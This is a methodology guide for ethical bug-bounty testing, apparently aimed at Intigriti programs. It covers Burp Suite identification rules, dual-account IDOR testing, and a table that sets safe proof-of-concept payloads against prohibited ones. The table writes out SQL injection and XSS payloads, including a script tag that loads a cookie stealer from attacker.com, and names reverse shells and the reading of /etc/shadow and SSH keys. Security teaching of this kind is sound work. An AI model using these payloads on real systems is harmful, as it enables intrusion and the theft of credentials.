# 🛠️ Ethical Testing Methodology & Tactical Guide

A practical guide for developers conducting manual, high-impact, non-destructive vulnerability research.

---

## 1. Proxy & Identification Setup

Most enterprise programs (including Adobe on Intigriti) require researchers to clearly identify their testing traffic.

### Burp Suite Match and Replace Rule:
To automatically attach your researcher identity to every HTTP request:
1. Open Burp Suite -> **Settings** -> **Tools** -> **Proxy**.
2. Scroll to **Match and Replace rules** -> Click **Add**.
3. Configure:
   * **Enabled**: True
   * **Type**: `Request header`
   * **Match**: *(leave blank)*
   * **Replace**: `X-Intigriti-Username: <your-username>`
   * **Comment**: `Intigriti Researcher Identification`

### Scope Isolation:
1. Navigate to **Target** -> **Scope settings**.
2. Add the target wildcard domains (e.g., `*.example.com`).
3. Check **Use advanced scope control**.
4. In **Proxy** -> **Proxy settings**, configure **Don't send items to Proxy history that are out of scope** to prevent cluttering logs with third-party traffic.

---

## 2. Dual-Account Testing Model (User A vs. User B)

The cleanest, most ethical way to test authorization flaws (IDOR, BOLA, privilege escalation) without risking customer data is the dual-account model:

```
[Attacker Context: User A]                 [Victim Context: User B]
  - Registered with intigriti.me email       - Registered with intigriti.me email
  - Owns Project ID: 101                     - Owns Project ID: 202
  - Role: Standard Member                    - Role: Admin or Standard Member
```

### Safe Test Procedure:
1. Log in as **User B** and create a benign test resource (e.g., document, project, or webhook). Note its identifier (`ID: 202`).
2. Log in as **User A** in a separate browser container/session.
3. Attempt to view, modify, or delete `ID: 202` using User A's session token.
4. **Success criteria**: If User A receives the private details or successfully modifies `ID: 202`, authorization is broken.
5. **Stop**: Do not attempt to query arbitrary IDs (e.g., `ID: 1`, `ID: 2`) belonging to real users.

---

## 3. Safe Proof-of-Concept Matrix

| Vulnerability Type | Safe Ethical PoC | Prohibited Unethical Action |
| :--- | :--- | :--- |
| **SQL Injection** | `UNION SELECT @@version, 1, 1--` or `AND (SELECT 1 FROM (SELECT SLEEP(3))a)` | `UNION SELECT username, password_hash FROM users` or dumping databases via `sqlmap --dump` |
| **Cross-Site Scripting (XSS)** | `<script>console.log(document.domain)</script>` or `<img src=x onerror=alert(origin)>` | `<script src="https://attacker.com/cookie-stealer.js"></script>` or phishing modals |
| **Remote Code Execution (RCE)** | `whoami`, `id`, `uname -a` | Uploading persistent PHP webshells, netcat reverse shells, modifying cron jobs |
| **SSRF** | Canary DNS/HTTP pingback via Burp Collaborator or loopback `127.0.0.1:80` | Port scanning internal CIDR ranges (`10.0.0.0/8`, `192.168.0.0/16`) or accessing cloud metadata (`169.254.169.254`) |
| **Directory Traversal / LFI** | Reading benign system identification like `/etc/issue` or `win.ini` | Reading `/etc/shadow`, private keys (`~/.ssh/id_rsa`), or configuration credentials |
| **CORS Misconfiguration** | Proving `Access-Control-Allow-Origin: https://attacker.com` with `Access-Control-Allow-Credentials: true` using test account credentials | Harvesting sensitive user sessions of third-party visitors |

---

## 4. High-Yield Developer Focus Areas

As a developer, focus on business logic and API implementation flaws where automated tools fail:

1. **Mass Assignment / Parameter Binding**:
   * Inspect JSON payloads on `POST` or `PUT` endpoints (e.g., `/api/user/profile`).
   * Test adding parameters like `"role": "admin"`, `"is_verified": true`, or `"account_balance": 1000`.
2. **Broken Object Level Authorization (BOLA)**:
   * Test REST and GraphQL endpoints that accept numeric, UUID, or string identifiers in path parameters or query arguments.
3. **State Machine Bypass**:
   * Test payment flows, wizard steps, or approval chains by submitting completion requests without completing prerequisite steps.
4. **Improper Rate Limiting on Expensive Operations**:
   * Check CPU/memory-intensive actions (e.g., complex PDF report generation, large export generation) for resource exhaustion vulnerabilities without degrading service availability.
